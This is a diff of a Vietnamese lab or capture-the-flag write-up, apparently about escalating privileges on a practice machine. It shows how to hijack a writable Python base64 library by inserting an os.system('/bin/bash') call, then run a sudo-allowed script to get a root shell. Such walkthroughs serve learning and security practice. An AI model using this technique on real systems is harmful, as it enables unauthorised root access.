@@ -220,23 +220,31 @@ Sử dụng `ssh` để loggin tài khoản user randy` và tiến hành khai th
 
 ![image](https://github.com/user-attachments/assets/bb7b5de1-027c-4faf-b404-646d4d1c63cb)
 
-![image](https://github.com/user-attachments/assets/e66ff7bb-a090-4a3d-b04f-944e0e055d7f)
+![image](https://github.com/user-attachments/assets/8cc0c969-4fbf-44f0-8c1d-ce5d4b5cff78)
 
 `/home/randy/randombase64.py` có thể bị khai thác để nâng cao đặc quyền:
 
-![image](https://github.com/user-attachments/assets/0736cb12-a692-495d-91b6-bb2209c289f4)
+![image](https://github.com/user-attachments/assets/4d6f42e1-e5b9-45da-b539-22f2c8292fe9)
 
-Để có được vị trí tệp base64, tôi sử dụng lệnh `locate`. Trong vài giây, tôi phát hiện ra tọa độ của nó. Tôi đã điều tra các hạn chế của tệp. Sử dụng tập tin này, chúng ta có thể có quyền truy cập root.
+Để có được vị trí tệp base64, sử dụng lệnh `locate`. Trong vài giây, phát hiện ra tọa độ của nó. Điều tra các hạn chế của tệp, Sử dụng tập tin này, chúng ta có thể có quyền truy cập root.
 
     locate base64
     ls -la /usr/lib/python3.8/base64.py
 
-![image](https://github.com/user-attachments/assets/1b4fa2e3-3371-4e66-bd24-2625ee95e984)
+![image](https://github.com/user-attachments/assets/ad88eea7-56d4-43df-9da8-29d04082720e)
 
 Tôi đã thực hiện một số thay đổi đối với tệp python base64 này bằng lệnh `nano`. Thêm mã này để có quyền truy cập root vào máy của nạn nhân.
 
     import os
     os.system ("/bin/bash")
+    
+![image](https://github.com/user-attachments/assets/a446acf2-b5e7-46df-bfde-2fc12ca57f9c)
+
+Run file và thu được kết quả `sudo /usr/bin/python3.8 /home/randy/randombase64.py`
+
+![image](https://github.com/user-attachments/assets/6154af98-9132-4c9a-8979-7c35cd1c4f5d)
+
+
 
 
 
